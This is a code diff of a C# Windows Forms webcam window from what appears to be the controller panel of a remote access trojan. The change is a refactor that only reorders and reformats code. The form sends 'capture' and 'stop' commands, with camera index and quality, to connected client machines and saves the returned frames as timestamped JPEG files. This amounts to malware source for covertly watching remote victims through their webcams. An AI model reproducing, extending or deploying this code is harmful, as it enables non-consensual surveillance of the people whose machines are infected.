@@ -1,114 +1,118 @@
-﻿using Server.MessagePack;
-using Server.Connection;
-using System;
-using System.Collections.Generic;
-using System.ComponentModel;
-using System.Data;
+﻿using System;
 using System.Diagnostics;
 using System.Drawing;
 using System.Drawing.Imaging;
 using System.IO;
-using System.Linq;
-using System.Text;
 using System.Threading;
-using System.Threading.Tasks;
 using System.Windows.Forms;
+using Server.Connection;
+using Server.MessagePack;
+using Server.Properties;
 
 namespace Server.Forms
 {
     public partial class FormWebcam : Form
     {
-        public Form1 F { get; set; }
-        internal Clients Client { get; set; }
-        internal Clients ParentClient { get; set; }
-        public string FullPath { get; set; }
+        public int FPS = 0;
+        public bool SaveIt;
 
         public Stopwatch sw = Stopwatch.StartNew();
-        public int FPS = 0;
-        public bool SaveIt = false;
-        public Image GetImage { get; set; }
+
         public FormWebcam()
         {
             InitializeComponent();
         }
 
+        public Form1 F { get; set; }
+        internal Clients Client { get; set; }
+        internal Clients ParentClient { get; set; }
+        public string FullPath { get; set; }
+        public Image GetImage { get; set; }
+
         private void Button1_Click(object sender, EventArgs e)
         {
             try
             {
-                if (button1.Tag == (object)"play")
+                if ((string)button1.Tag == "play")
                 {
-                    MsgPack msgpack = new MsgPack();
+                    var msgpack = new MsgPack();
                     msgpack.ForcePathObject("Pac_ket").AsString = "webcam";
                     msgpack.ForcePathObject("Command").AsString = "capture";
                     msgpack.ForcePathObject("List").AsInteger = comboBox1.SelectedIndex;
                     msgpack.ForcePathObject("Quality").AsInteger = Convert.ToInt32(numericUpDown1.Value);
                     ThreadPool.QueueUserWorkItem(Client.Send, msgpack.Encode2Bytes());
-                    button1.Tag = (object)"stop";
-                    button1.BackgroundImage = Properties.Resources.stop__1_;
+                    button1.Tag = "stop";
+                    button1.BackgroundImage = Resources.stop__1_;
                     numericUpDown1.Enabled = false;
                     comboBox1.Enabled = false;
                     btnSave.Enabled = true;
                 }
                 else
                 {
-                    button1.Tag = (object)"play";
-                    MsgPack msgpack = new MsgPack();
+                    button1.Tag = "play";
+                    var msgpack = new MsgPack();
                     msgpack.ForcePathObject("Pac_ket").AsString = "webcam";
                     msgpack.ForcePathObject("Command").AsString = "stop";
                     ThreadPool.QueueUserWorkItem(Client.Send, msgpack.Encode2Bytes());
-                    button1.BackgroundImage = Properties.Resources.play_button;
-                    btnSave.BackgroundImage = Properties.Resources.save_image;
+                    button1.BackgroundImage = Resources.play_button;
+                    btnSave.BackgroundImage = Resources.save_image;
                     numericUpDown1.Enabled = true;
                     comboBox1.Enabled = true;
                     btnSave.Enabled = false;
                     timerSave.Stop();
                 }
             }
-            catch { }
+            catch
+            {
+            }
         }
 
         private void Timer1_Tick(object sender, EventArgs e)
         {
             try
             {
-                if (!ParentClient.TcpClient.Connected || !Client.TcpClient.Connected) this.Close();
+                if (!ParentClient.TcpClient.Connected || !Client.TcpClient.Connected) Close();
             }
-            catch { this.Close(); }
+            catch
+            {
+                Close();
+            }
         }
 
         private void FormWebcam_FormClosed(object sender, FormClosedEventArgs e)
         {
             try
             {
-                ThreadPool.QueueUserWorkItem((o) =>
-                {
-                    Client?.Disconnected();
-                });
+                ThreadPool.QueueUserWorkItem(o => { Client?.Disconnected(); });
             }
-            catch { }
+            catch
+            {
+            }
         }
 
         private void BtnSave_Click(object sender, EventArgs e)
         {
-            if (button1.Tag == (object)"stop")
+            if ((string)button1.Tag == "stop")
             {
                 if (SaveIt)
                 {
                     SaveIt = false;
                     //timerSave.Stop();
-                    btnSave.BackgroundImage = Properties.Resources.save_image;
+                    btnSave.BackgroundImage = Resources.save_image;
                 }
                 else
                 {
-                    btnSave.BackgroundImage = Properties.Resources.save_image2;
+                    btnSave.BackgroundImage = Resources.save_image2;
                     try
                     {
                         if (!Directory.Exists(FullPath))
                             Directory.CreateDirectory(FullPath);
                         Process.Start(FullPath);
                     }
-                    catch { }
+                    catch
+                    {
+                    }
+
                     SaveIt = true;
                     //timerSave.Start();
                 }
@@ -121,9 +125,12 @@ namespace Server.Forms
             {
                 if (!Directory.Exists(FullPath))
                     Directory.CreateDirectory(FullPath);
-                pictureBox1.Image.Save(FullPath + $"\\IMG_{DateTime.Now.ToString("MM-dd-yyyy HH;mm;ss")}.jpeg", ImageFormat.Jpeg);
+                pictureBox1.Image.Save(FullPath + $"\\IMG_{DateTime.Now.ToString("MM-dd-yyyy HH;mm;ss")}.jpeg",
+                    ImageFormat.Jpeg);
             }
-            catch { }
+            catch
+            {
+            }
         }
     }
 }
